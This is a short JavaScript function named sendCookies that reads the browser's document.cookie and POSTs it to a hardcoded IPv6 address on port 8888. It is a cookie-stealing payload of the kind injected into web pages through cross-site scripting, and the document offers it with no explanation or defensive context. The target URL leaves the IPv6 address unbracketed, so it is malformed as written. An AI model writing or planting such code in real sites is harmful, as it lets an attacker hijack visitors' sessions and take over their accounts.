function sendCookies() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  var cookies = document.cookie;
  xhr.send("cookies=" + encodeURIComponent(cookies));
}
